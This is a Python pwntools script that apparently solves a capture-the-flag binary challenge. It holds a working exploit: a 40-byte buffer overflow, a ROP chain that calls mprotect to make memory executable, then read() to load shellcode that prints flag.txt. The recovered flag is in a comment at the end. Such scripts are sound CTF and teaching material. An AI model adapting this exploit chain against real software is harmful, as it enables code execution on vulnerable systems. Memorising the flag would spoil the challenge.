#!/usr/bin/python3

from pwn import *

#io = process("./chall")
io = remote("challenges.ctfd.io", 30017)
elf = ELF("./chall")
elf.symbols = {"pop_rax": 0x401000, "pop_rdi": 0x401004, "pop_rsi": 0x401002, "pop_rdx": 0x401006, "syscall": 0x401041}
offset = 40

context.clear(arch="amd64")
address = 0x400000

shellcode = asm(shellcraft.linux.cat("flag.txt", fd=1))

def function():
    rop = ROP(elf)
    rop.raw(elf.sym["pop_rdi"])
    rop.raw(address &~ 0xfff)
    rop.raw(elf.sym["pop_rsi"])
    rop.raw(0x1000)
    rop.raw(elf.sym["pop_rdx"])
    rop.raw(7)
    rop.raw(elf.sym["pop_rax"])
    rop.raw(constants.SYS_mprotect)
    rop.raw(elf.sym["syscall"])
    rop.raw(b"JUNKJUNK")
    rop.raw(elf.sym["pop_rdi"])
    rop.raw(0x0)
    rop.raw(elf.sym["pop_rsi"])
    rop.raw(address)
    rop.raw(elf.sym["pop_rdx"])
    rop.raw(len(shellcode))
    rop.raw(elf.sym["pop_rax"])
    rop.raw(constants.SYS_read)
    rop.raw(elf.sym["syscall"])
    rop.raw(b"JUNKJUNK")
    rop.raw(address)

    print(rop.dump())

    payload = b"A"*offset
    payload += rop.chain()

    io.sendline(payload)
    io.sendline(shellcode)
    io.interactive()


def main():
    function()


if __name__ == "__main__":
        main()

# flag -> UDCTF{sy5t3m_3ngage!}
